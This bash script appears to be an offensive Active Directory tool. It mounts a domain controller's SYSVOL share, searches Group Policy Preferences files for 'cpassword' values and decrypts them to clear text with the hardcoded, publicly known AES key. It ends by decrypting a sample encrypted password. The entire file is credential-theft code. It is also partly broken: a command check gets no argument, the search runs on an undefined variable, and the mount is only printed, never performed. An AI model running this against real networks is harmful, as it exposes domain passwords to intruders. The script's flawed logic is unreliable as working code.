#!/bin/bash

SMBCLIENT="/usr/bin/smbclient"
MCIFS="/sbin/mount.cifs"
SUDO="/usr/bin/sudo"
MKDIR="/bin/mkdir"

function decryptGPP {
	AES_KEY="4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
	cpassword="$1"

	# Pad
	len2pad=$((16 - ${#cpassword} % 16))
	pad=$(printf "=%.0s" $(seq 1 $len2pad))
	cpassword="$cpassword$pad"

	# Decrypt
	result=$(echo "$cpassword" | openssl enc -aes-256-cbc -A -base64 -d -K "$AES_KEY" -iv "00000000000000000000000000000000" 2>/dev/null | tr -d '\0')

	# Unpad
	len2unpad=${result: -1}
	len2unpad=$(printf '%d' "'$len2unpad")
	if [ $len2unpad > 0 ]; then
		echo "Clear-text password: ${result:0:-$len2unpad}"
	else
		echo "Clear-text password: $result"
	fi
}

function mountSMB {
	MOUNT_POINT="/tmp/sysvol_$IP"
	echo "[*] The script will now mount the SYSVOL share at $MOUNT_POINT (as read-only)"
	echo "$SUDO $MCIFS //$IP/sysvol $MOUNT_POINT -o ro,domain=$DOMAIN,user=$USER,uid=1000,gid=1000"
}

function usage {
	echo "usage"
}

function checkCmdExist {
	if [ ! -x "$(command -v $1)" ]; then echo "[!] Can't find mandatory command: $1" & exit 1; fi
}

###############
# Starts here #
###############
IP="192.168.1.1"
DOMAIN="test"
USER="test"

# Check commands
checkCmdExist

# Mount directory
mountSMB "$MCIFS"

# Look for files with "cpassword="
/bin/grep -rni "cpassword=" "$mnt" | while read line
do
	echo "$line"
done

decryptGPP 9QHhFTUdm6rDgu30J7ShZfqt07T6vOUGkyAFG3G7M+5AotJjkOva7E9KSAcamdrruTgly0O/uVTB/UUdLNU4775b5381hyuUzkd4lJW+llcNNNrQlYu7zqH3/i+8jfjhUq9lqPn8VjCtb9iaEqWbKQ
